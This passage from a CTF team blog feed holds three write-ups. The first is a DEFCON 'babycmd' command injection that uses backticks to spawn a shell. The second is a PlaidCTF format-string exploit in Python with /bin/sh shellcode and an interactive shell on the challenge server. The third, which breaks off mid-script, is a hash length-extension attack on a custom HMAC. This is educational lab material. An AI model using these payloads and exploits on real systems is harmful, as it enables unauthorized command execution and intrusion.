<code>sub_E35</code>: parse and execute ping<br/>
<code>sub_121E</code>: main()<br/>
<code>sub_D65</code>: parse the input<br/>
<code>sub_DCC</code>: filter the input</p></li>
<li><p><code>ping</code> does not seem to be vulnerable:</p></li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
</span><span class='line'>{
</span><span class='line'>  if ( inet_aton(&cp, &v4) )
</span><span class='line'>  {
</span><span class='line'>    v1 = inet_ntoa(v4);
</span><span class='line'>    __sprintf_chk(&command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
</span><span class='line'>    v2 = popen(&command, "r");
</span><span class='line'>    if ( v2 )
</span><span class='line'>    {
</span><span class='line'>      while ( fgets(&s, 512, v2) )
</span><span class='line'>        __printf_chk(1LL, &s);
</span><span class='line'>      pclose(v2);
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>the <code>v1</code>  param which passes to <code>sprintf</code> returning from <code>inet_ntoa</code> so it cannot be a arbitrary value.</p>

<ol>
<li>let&rsquo;s look at host code:</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>__int64 __fastcall sub_10BD(__int64 a1)
</span><span class='line'>{
</span><span class='line'>  char *v1; // rax@6
</span><span class='line'>  FILE *v2; // rbp@10
</span><span class='line'>  struct in_addr v4; // [sp+0h] [bp-538h]@5
</span><span class='line'>  char command; // [sp+10h] [bp-528h]@6
</span><span class='line'>  char cp; // [sp+190h] [bp-3A8h]@3
</span><span class='line'>  char s; // [sp+310h] [bp-228h]@12
</span><span class='line'>  __int64 v8; // [sp+518h] [bp-20h]@1
</span><span class='line'>
</span><span class='line'>  v8 = *MK_FP(__FS__, 40LL);
</span><span class='line'>  if ( a1 )
</span><span class='line'>  {
</span><span class='line'>    if ( (unsigned int)sub_D65(a1, (__int64)&cp) )
</span><span class='line'>    {
</span><span class='line'>      if ( inet_aton(&cp, &v4) )
</span><span class='line'>      {
</span><span class='line'>        v1 = inet_ntoa(v4);
</span><span class='line'>        __sprintf_chk(&command, 1LL, 384LL, "host %s", v1);
</span><span class='line'>      }
</span><span class='line'>      else
</span><span class='line'>      {
</span><span class='line'>        if ( !(unsigned int)sub_DCC((__int64)&cp) )
</span><span class='line'>        {
</span><span class='line'>          puts("Invalid hostname.");
</span><span class='line'>          return *MK_FP(__FS__, 40LL) ^ v8;
</span><span class='line'>        }
</span><span class='line'>        __sprintf_chk(&command, 1LL, 384LL, "host \"%s\"", &cp);
</span><span class='line'>      }
</span><span class='line'>      v2 = popen(&command, "r");
</span><span class='line'>      if ( v2 )
</span><span class='line'>      {
</span><span class='line'>        while ( fgets(&s, 512, v2) )
</span><span class='line'>          __printf_chk(1LL, &s);
</span><span class='line'>        pclose(v2);
</span><span class='line'>      }
</span><span class='line'>      else
</span><span class='line'>      {
</span><span class='line'>        puts("Command failed.");
</span><span class='line'>      }
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>      puts("Invalid Host or IP address sent to dig.");
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>  else
</span><span class='line'>  {
</span><span class='line'>    puts("No address specified.");
</span><span class='line'>  }
</span><span class='line'>  return *MK_FP(__FS__, 40LL) ^ v8;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>As you can see, second <code>__sprintf_chk</code> may acts unexpectedly. but there could be problem in using <code>sub_DCC</code>.</p>

<ol>
<li><code>sub_DCC</code> code:</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>signed __int64 __fastcall sub_DCC(__int64 a1)
</span><span class='line'>{
</span><span class='line'>  __int64 v1; // rsi@1
</span><span class='line'>  signed __int64 v2; // rcx@1
</span><span class='line'>  bool v3; // zf@3
</span><span class='line'>  signed __int64 v4; // rcx@4
</span><span class='line'>  signed __int64 result; // rax@4
</span><span class='line'>  char v6; // dl@7
</span><span class='line'>
</span><span class='line'>  v1 = a1;
</span><span class='line'>  v2 = -1LL;
</span><span class='line'>  do
</span><span class='line'>  {
</span><span class='line'>    if ( !v2 )
</span><span class='line'>      break;
</span><span class='line'>    v3 = *(_BYTE *)a1++ == 0;
</span><span class='line'>    --v2;
</span><span class='line'>  }
</span><span class='line'>  while ( !v3 );
</span><span class='line'>  v4 = ~v2;
</span><span class='line'>  result = 0LL;
</span><span class='line'>  if ( (unsigned __int64)(v4 - 4) &lt;= 0x3C )
</span><span class='line'>  {
</span><span class='line'>    if ( (unsigned __int8)((*(_BYTE *)v1 & 0xDF) - 0x41) &lt;= 0x19u
</span><span class='line'>      || (result = 0LL, (unsigned __int8)(*(_BYTE *)v1 - 48) &lt;= 9u) )
</span><span class='line'>    {
</span><span class='line'>      v6 = *(_BYTE *)(v1 + v4 - 1 - 1);
</span><span class='line'>      result = 1LL;
</span><span class='line'>      if ( (unsigned __int8)((v6 & 0xDF) - 0x41) &gt; 0x19u )
</span><span class='line'>        result = (unsigned __int8)(v6 - 0x30) &lt;= 9u;
</span><span class='line'>    }
</span><span class='line'>  }
</span><span class='line'>  return result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>i just noticed that it filters some bytes but not chr(0x60) which can be used to execute command and tried some tests on input.</p>

<p>finally i could run command like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./babycmd_3ad28b10e8ab283d7df81795075f600b 
</span><span class='line'>
</span><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host l`ls`l
</span><span class='line'>host: 'lbabycmd_3ad28b10e8ab283d7df81795075f600b
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id0
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id1
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.id2
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.nam
</span><span class='line'>babycmd_3ad28b10e8ab283d7df81795075f600b.til
</span><span class='line'>logl' is not a legal name (label too long)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: 
</span></code></pre></td></tr></table></div></figure>


<p>but trying something like this <code>host l`ls /home/`l</code> can be seen below:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host l`ls /home/`l
</span><span class='line'>sh: 1: ls/home/: not found
</span><span class='line'>Host ll not found: 3(NXDOMAIN)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: </span></code></pre></td></tr></table></div></figure>


<p>it filters space, so i can&rsquo;t run any command.
but instead of reversing the filter function, i can use <code>sh</code>, aren&rsquo;t i :)) ?</p>

<p>So here&rsquo;s my points:</p>

<ol>
<li>enter <code>host l`sh`l</code> as command</li>
<li>enter:<br/>
<code>cat /home/babycmd/flag</code></li>
<li>Press Ctrl+D</li>
<li>Press Ctrl+C</li>
</ol>


<p>So here we go:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc babycmd_3ad28b10e8ab283d7df81795075f600b.quals.shallweplayaga.me 15491
</span><span class='line'>Welcome to another Baby's First Challenge!
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: host l`sh`l
</span><span class='line'>cat /home/babycmd/flag [Enter] [Ctrl+D]
</span><span class='line'>: host: 'lThe flag is: Pretty easy eh!!~ Now let's try something hArd3r, shallwe??1' is not in legal name syntax (label too long)
</span><span class='line'>Commands: ping, dig, host, exit
</span><span class='line'>: ^C</span></code></pre></td></tr></table></div></figure>


<p>So we have first 1 point at DEFCONCTF.</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PlaidCTF CTF 2015 - EBP Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup/"/>
    <updated>2015-04-20T22:40:13+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/20/plaidctf-ctf-2015-ebp-writeup</id>
    <content type="html"><![CDATA[<p><strong>PlaidCTF 2015 EBP Writeup</strong><br/>
<strong>Point = 160</strong><br/>
<strong>Category = Pwnable</strong></p>

<p>Unfortunately the CTF time for our team was completely under heavy pressure. but here is one i solved in my free time.</p>

<blockquote><p>Category: Pwnable Points: 160 Solves: 157 Description:
   nc 52.6.64.173 4545
   Download: %p%o%o%p.</p></blockquote>

<p>We are given an ELF file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
</span><span class='line'>ebp_a96f7231ab81e1b0d7fe24d660def25a.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped</span></code></pre></td></tr></table></div></figure>


<p>first attempt peresented us that it&rsquo;s a Format String Vulenrability.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
</span><span class='line'>%p%p%p%p%p
</span><span class='line'>0xa0x10xf76c40000xffec67180x804852c</span></code></pre></td></tr></table></div></figure>


<p>We noticed that the binary is provided with disabled NX.</p>

<!-- more -->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>checksec.sh --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf</span></code></pre></td></tr></table></div></figure>


<p>So it was pretty simple to run our shellcode and execute proper command to read the flag.</p>

<p>It was the time to see the binary. IDA showed us that the buggy function is <code>make_response</code> since no FMT was used.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int make_response()
</span><span class='line'>{
</span><span class='line'>  return snprintf(response, 0x400u, buf);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>but <code>response</code> and <code>buf</code> are on <strong>BSS</strong> and we should change execution flow to this address <code>0x0804A480</code>.</p>

<p>By dumping stack on executing <code>make_response</code> we had these values:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Breakpoint 1, 0x08048503 in make_response ()
</span><span class='line'>gdb-peda$ x/64wx $esp
</span><span class='line'>0xffffcc30:     0xf7fadc20      0x0804a080      0x000003ff      0x0000000a
</span><span class='line'>0xffffcc40:     0x00000001      0xf7fad000      0xffffcc68      0x0804852c
</span><span class='line'>0xffffcc50:     0xffffcc88      0xf7ff04b0      0xffffccb4      0xf7fad000
</span><span class='line'>0xffffcc60:     0x00000000      0x00000000      0xffffcc88      0x08048557
</span><span class='line'>0xffffcc70:     0x0804a080      0x00000400      0xf7fadc20      0xf7fad000
</span><span class='line'>0xffffcc80:     0x08048580      0x00000000      0x00000000      0xf7e1da83
</span><span class='line'>0xffffcc90:     0x00000001      0xffffcd24      0xffffcd2c      0xf7feac9a
</span><span class='line'>0xffffcca0:     0x00000001      0xffffcd24      0xffffccc4      0x0804a01c
</span><span class='line'>0xffffccb0:     0x08048278      0xf7fad000      0x00000000      0x00000000
</span><span class='line'>0xffffccc0:     0x00000000      0xb9b964cc      0x8594c0dc      0x00000000
</span><span class='line'>0xffffccd0:     0x00000000      0x00000000      0x00000001      0x08048400
</span><span class='line'>0xffffcce0:     0x00000000      0xf7ff04b0      0xf7e1d999      0xf7ffd000
</span><span class='line'>0xffffccf0:     0x00000001      0x08048400      0x00000000      0x08048421
</span><span class='line'>0xffffcd00:     0x08048547      0x00000001      0xffffcd24      0x08048580
</span><span class='line'>0xffffcd10:     0x080485f0      0xf7feb130      0xffffcd1c      0x0000001c
</span><span class='line'>0xffffcd20:     0x00000001      0xffffcf57      0x00000000      0xffffcf96</span></code></pre></td></tr></table></div></figure>


<p>You may notice that to overwriting a value via FMT vuln we should provide an address to <code>%n</code>. but we had just BSS variables so we should make this environment manually. As name of the challenge suggets we can use saved frame pointer since it has address of this frame. The scenario is pretty simple:</p>

<ol>
<li>leak an stack address to find location of RET address of current function <code>make_response</code>.</li>
<li>overwrite RET address in place of saved frame pointer (which ebp points to it).</li>
<li>again using a format string overwrite RET with <code>response</code> address.</li>
</ol>


<p>You should notice that we should write 2 least significant byte of ebp address location (%hhn).</p>

<p>TL;DR</p>

<p>This is what i used as exploiting this challenge:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
</span><span class='line'>import struct
</span><span class='line'>import telnetlib
</span><span class='line'>
</span><span class='line'>response = 0x0804a480
</span><span class='line'>
</span><span class='line'>offset = 4 # saved frame pointer offset 
</span><span class='line'>
</span><span class='line'>shellcode = (  # /bin/sh shellcode at http://shell-storm.org/shellcode/files/shellcode-236.php
</span><span class='line'>  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
</span><span class='line'>        "\x73\x68\x68\x2f\x62\x69\x6e\x54"
</span><span class='line'>        "\x5b\x52\x53\x54\x59\x0f\x34"
</span><span class='line'>)
</span><span class='line'>
</span><span class='line'>s = socket.create_connection(("52.6.64.173", 4545 ))
</span><span class='line'>#s = socket.create_connection(("127.0.0.1", 8080 ))
</span><span class='line'>s.send("%4$p\n")
</span><span class='line'>addr = int(s.recv(1024), 16)
</span><span class='line'>print "[+] Leaked Address: ", hex(addr)
</span><span class='line'>addr1 = (addr - 0x1c) & 0xffff
</span><span class='line'>print "[+] 2Byte Significant Byte to write : ", hex(addr1) 
</span><span class='line'>
</span><span class='line'>s.send("%"+str(addr1)+"x%"+str(offset)+"$hn\n")
</span><span class='line'>s.recv(4096)
</span><span class='line'>
</span><span class='line'>s.send(shellcode+"%"+str((response & 0xffff)-len(shellcode))+"x%"+str(12)+"$hn\n")
</span><span class='line'>print "[+] Here you go"
</span><span class='line'>t = telnetlib.Telnet()
</span><span class='line'>t.sock = s
</span><span class='line'>t.interact()</span></code></pre></td></tr></table></div></figure>


<p>running the exploit we have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python ebp-exploit.py 
</span><span class='line'>[+] Leaked Address:  0xffbea7c8
</span><span class='line'>[+] 2Byte Significant Byte to write :  0xa7ac
</span><span class='line'>[+] Here you go
</span><span class='line'>cat /home/problem/flag.txt
</span><span class='line'>who_needs_stack_control_anyway?</span></code></pre></td></tr></table></div></figure>


<p>So we&rsquo;ve got 160 point.</p>

<p>@HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Weshgrow Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/"/>
    <updated>2015-04-06T16:58:41+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Weshgrow Writeup</strong><br/>
<strong>Point = 300</strong><br/>
<strong>Category = Crypto</strong></p>

<p>By openning the url we redirected to following link:</p>

<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71">http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71</a></p></blockquote>

<p>As we know HMAC is a cryptographic message for authenticating using a secret key. So this has been made of something.</p>

<p>Also we could find another HMAC in the page source as you can see:</p>

<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b">http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b</a></p></blockquote>

<p>if you open the /flag address without the purposed HMAC you see redirection to <code>address+"#missinghmac"</code>.</p>

<p>So this could be HMAC of pages and we should prepare a HMAC for <code>flag</code>.</p>

<!--more-->


<p>By going further into login page, we noticed after submiting the form, HMAC of the password sent to the page not the password itself. it used BHE class in <code>bhe.js</code> as mentioned &ldquo;Best Hash Ever&rdquo;.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>var BestHashEver = function() {
</span><span class='line'>    this.state = [
</span><span class='line'>        str2bigInt('1336226589', 10),
</span><span class='line'>        str2bigInt('251977347', 10),
</span><span class='line'>        str2bigInt('716107527', 10),
</span><span class='line'>        str2bigInt('1774966033', 10),
</span><span class='line'>    ];
</span><span class='line'>};
</span><span class='line'>BestHashEver.prototype.bhe_round = function(byte) {
</span><span class='line'>    var c = str2bigInt('162888806', 10);
</span><span class='line'>    console.log(c);
</span><span class='line'>    for (var i=3; i&gt;0; i--) {
</span><span class='line'>        this.state[i] = mod(add(mult(this.state[0], this.state[i]), mult(this.state[0], int2bigInt(byte, 10))), str2bigInt('4294967295', 10));
</span><span class='line'>        console.log(this.state[i]);
</span><span class='line'>    }
</span><span class='line'>    this.state[0] = mod(add(mult(this.state[0], c), mult(this.state[1], int2bigInt(byte, 10))), str2bigInt('4294967295', 10));
</span><span class='line'>};
</span><span class='line'>BestHashEver.prototype.dword2hex = function(dw) {
</span><span class='line'>    var hexchars = ["0", "1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"];
</span><span class='line'>    var output = '';
</span><span class='line'>    var c1 = '', c2=''
</span><span class='line'>    for (var i = 0; i &lt; 4; i++) {
</span><span class='line'>        byte = dw & 0x0000000F;
</span><span class='line'>        c1 = hexchars[byte];
</span><span class='line'>        dw = (dw &gt;&gt; 4);
</span><span class='line'>        byte = dw & 0x0000000F;
</span><span class='line'>        c2 = hexchars[byte];
</span><span class='line'>        dw = (dw &gt;&gt; 4);
</span><span class='line'>        output = output + c2 + c1;
</span><span class='line'>    }
</span><span class='line'>    console.log(output);
</span><span class='line'>    return output;
</span><span class='line'>};
</span><span class='line'>BestHashEver.prototype.hash = function(data) {
</span><span class='line'>    for (var i = 0; i &lt; data.length; i++){
</span><span class='line'>        this.bhe_round(data.charCodeAt(i));
</span><span class='line'>        console.log(this.state);
</span><span class='line'>    }
</span><span class='line'>    /* Generate output. */
</span><span class='line'>    var digest = [
</span><span class='line'>        parseInt(bigInt2str(this.state[0], 10)),
</span><span class='line'>        parseInt(bigInt2str(this.state[1], 10)),
</span><span class='line'>        parseInt(bigInt2str(this.state[2], 10)),
</span><span class='line'>        parseInt(bigInt2str(this.state[3], 10)),
</span><span class='line'>    ];
</span><span class='line'>    return this.dword2hex(digest[0]) + this.dword2hex(digest[1]) + this.dword2hex(digest[2]) +
</span><span class='line'>    this.dword2hex(digest[3]);
</span><span class='line'>};
</span><span class='line'>function hmac(data) {
</span><span class='line'>    _bhe = new BestHashEver();
</span><span class='line'>    return _bhe.hash(data);
</span><span class='line'>}
</span></code></pre></td></tr></table></div></figure>


<p>The Hash like md5 has four state variables and multiple rounds which in each round based on previous values and variables, formulas generate a new state variables and change them. Also it has four initialize state value as default.</p>

<p>In this Algorithm each round is for every character of inputs which at the end output produced by hex and concatenation of final state variable.</p>

<p>But there are some flaw in the algorithm such as not using length of input and &hellip;</p>

<p>This means if we know the state variable value for some string <code>s</code>, we can continue the rounds and produce the output of <code>s+x</code> for any <code>x</code>. this attack mentioned as <code>hash length extension attack</code>.</p>

<p>It&rsquo;s obvious that we can obtain state variable&#8217; value from HASH(s). The reader should notice that in the <code>bhe.js</code> <strong>Big Endian byte order</strong> has been used.</p>

<p>So we have:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hash(s+x, default initialize state value) = Hash(s, state value of hash(s))</span></code></pre></td></tr></table></div></figure>


<p>based on what discussed earlier and some knowledge about HMAC our scenario is:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HMAC(message)= Hash(secret + message)</span></code></pre></td></tr></table></div></figure>


<p>which page name will be used as <code>message</code>. As you saw we have valid HMAC for empty(NULL) page name, so:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HMAC("") = Hash(secret)
</span><span class='line'>
</span><span class='line'>HMAC("flag") = Hash(s, state value of HMAC(""))
</span></code></pre></td></tr></table></div></figure>


<p>In order to obtain the proper HMAC i wrote a python script but it can be done by changing default value in js too.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>def convert2be(s):#convert to big endian byte order
</span><span class='line'>    return s[6:8]+s[4:6]+s[2:4]+s[0:2]
</span><span class='line'>    
</span><span class='line'>def myhex(s):
</span><span class='line'>    return convert2be(hex(s)[2:-1].rjust(8,'0'))
</span><span class='line'>    
</span><span class='line'>def hash(inp,state=[1336226589,251977347,716107527,1774966033]):
</span><span class='line'>    a,b,c,d=state[0],state[1],state[2],state[3]
</span><span class='line'>    m=4294967295
</span><span class='line'>    for x in inp:
</span><span class='line'>        x=ord(x)
</span><span class='line'>        aa=(a*(162888806+x*(b+x)))%m
</span><span class='line'>        bb=(a*(b+x))%m
